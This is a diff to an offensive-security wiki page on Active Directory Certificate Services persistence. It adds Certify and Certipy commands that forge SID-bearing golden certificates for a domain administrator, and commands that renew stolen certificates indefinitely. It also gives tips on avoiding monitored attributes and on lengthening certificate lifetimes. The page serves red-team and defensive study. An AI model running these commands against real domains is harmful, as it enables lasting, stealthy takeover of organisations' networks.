@@ -63,9 +63,25 @@ Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
 ```
 
 Notes
-- If you can craft forged certificates that include the SID security extension, those will map implicitly even under Full Enforcement. Otherwise, prefer explicit strong mappings. See 
-[account-persistence](account-persistence.md) for more on explicit mappings.
+- If you can craft forged certificates that include the SID security extension, those will map implicitly even under Full Enforcement. Otherwise, prefer explicit strong mappings. See [account-persistence](account-persistence.md) for more on explicit mappings.
 - Revocation does not help defenders here: forged certificates are unknown to the CA database and thus cannot be revoked.
+
+#### Full-Enforcement compatible forging (SID-aware)
+
+Updated tooling lets you embed the SID directly, keeping golden certificates usable even when DCs reject weak mappings:
+
+```bash
+# Certify 2.0 integrates ForgeCert and can embed SID
+Certify.exe forge --ca-pfx CORP-DC-CA.pfx --ca-pass Password123! \
+  --upn administrator@corp.local --sid S-1-5-21-1111111111-2222222222-3333333333-500 \
+  --outfile administrator_sid.pfx
+
+# Certipy also supports SID in forged certs
+certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local \
+  -sid S-1-5-21-1111111111-2222222222-3333333333-500 -out administrator_sid.pfx
+```
+
+By embedding the SID you avoid having to touch `altSecurityIdentities`, which may be monitored, while still satisfying strong mapping checks.
 
 ## Trusting Rogue CA Certificates - DPERSIST2
 
@@ -110,12 +126,27 @@ Practical knobs attackers may set for long-term domain persistence (see {{#ref}}
 > [!TIP]
 > In hardened environments after KB5014754, pairing these misconfigurations with explicit strong mappings (`altSecurityIdentities`) ensures your issued or forged certificates remain usable even when DCs enforce strong mapping.
 
+### Certificate renewal abuse (ESC14) for persistence
+
+If you compromise an authentication-capable certificate (or an Enrollment Agent one), you can **renew it indefinitely** as long as the issuing template remains published and your CA still trusts the issuer chain. Renewal keeps the original identity bindings but extends validity, making eviction difficult unless the template is fixed or the CA is republished.
+
+```bash
+# Renew a stolen user cert to extend validity
+certipy req -ca CORP-DC-CA -template User -pfx stolen_user.pfx -renew -out user_renewed_2026.pfx
+
+# Renew an on-behalf-of cert issued via an Enrollment Agent
+certipy req -ca CORP-DC-CA -on-behalf-of 'CORP/victim' -pfx agent.pfx -renew -out victim_renewed.pfx
+```
+
+If domain controllers are in **Full Enforcement**, add `-sid <victim SID>` (or use a template that still includes the SID security extension) so the renewed leaf certificate continues to map strongly without touching `altSecurityIdentities`. Attackers with CA admin rights may also tweak `policy\RenewalValidityPeriodUnits` to lengthen renewed lifetimes before issuing themselves a cert.
 
 
 ## References
 
-- Microsoft KB5014754 – Certificate-based authentication changes on Windows domain controllers (enforcement timeline and strong mappings). https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16
-- Certipy – Command Reference and forge/auth usage. https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference
+- [Microsoft KB5014754 – Certificate-based authentication changes on Windows domain controllers (enforcement timeline and strong mappings)](https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16)
+- [Certipy – Command Reference and forge/auth usage](https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference)
+- [SpecterOps – Certify 2.0 (integrated forge with SID support)](https://specterops.io/blog/2025/08/11/certify-2-0/)
+- [ESC14 renewal abuse overview](https://www.adcs-security.com/attacks/esc14)
 - [0xdf – HTB: Certificate (SeManageVolumePrivilege to exfil CA keys → Golden Certificate)](https://0xdf.gitlab.io/2025/10/04/htb-certificate.html)
 
 {{#include ../../../banners/hacktricks-training.md}}
